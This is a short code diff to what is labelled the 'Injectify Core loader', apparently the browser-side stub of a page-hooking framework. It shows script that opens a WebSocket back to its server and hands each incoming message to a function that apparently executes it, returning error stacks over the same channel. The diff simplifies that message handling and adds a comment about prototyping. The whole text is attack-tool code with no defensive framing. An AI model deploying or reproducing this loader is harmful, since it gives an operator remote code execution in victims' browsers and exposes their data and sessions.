@@ -1,4 +1,7 @@
 <script>
+  /**
+   * Injectify Core loader, unminified for rapid prototyping
+   */
   let Protocol = window.location.protocol == 'https:' ? 'wss' : 'ws';
 
   (function i() {
@@ -6,12 +9,9 @@
     ws = new WebSocket(`${Protocol}://${location.host}/i?$${btoa('private')}`)
     ws.onmessage = function (d) {
       try {
-        _(JSON.parse(d.data).d)
+        _(d.data)
       } catch (e) {
-        ws.send(JSON.stringify({
-          t: 'e',
-          d: e.stack,
-        }))
+        ws.send('e:' + JSON.stringify(e.stack))
       }
     }
     ws.onclose = function () {
